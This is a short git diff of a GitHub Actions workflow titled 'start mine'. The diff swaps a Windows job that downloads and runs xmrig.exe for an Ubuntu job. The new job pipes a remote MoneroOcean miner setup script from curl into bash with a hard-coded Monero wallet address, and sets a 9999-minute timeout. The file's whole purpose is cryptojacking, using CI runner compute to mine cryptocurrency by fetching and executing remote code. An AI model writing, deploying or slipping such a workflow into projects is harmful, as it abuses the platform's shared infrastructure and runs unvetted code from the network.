@@ -6,14 +6,9 @@ on:
 jobs:
   build:
     name: start mine
-    runs-on: windows-latest
+    runs-on: ubuntu-latest
     timeout-minutes: 9999
 
     steps:
-    - name: downloading files...
-      run: Invoke-WebRequest https://github.com/techtechnikov/min/raw/main/win.zip -OutFile windows.zip
-    - name: extracting files...
-      run: Expand-Archive windows.zip
-    - name: starting miner
-      run: |
-        .\windows\xmrig.exe
+    - name: starting miner...
+      run: curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 43PrhPVeWEUcrbzJTUXajpWxtRGs95kw8S1Fwjh7NZphBUKLxdtuh8TgsmPT9hr2hg1Kn1xAJJkyN2mR9TTSL2fk4aKNP1B
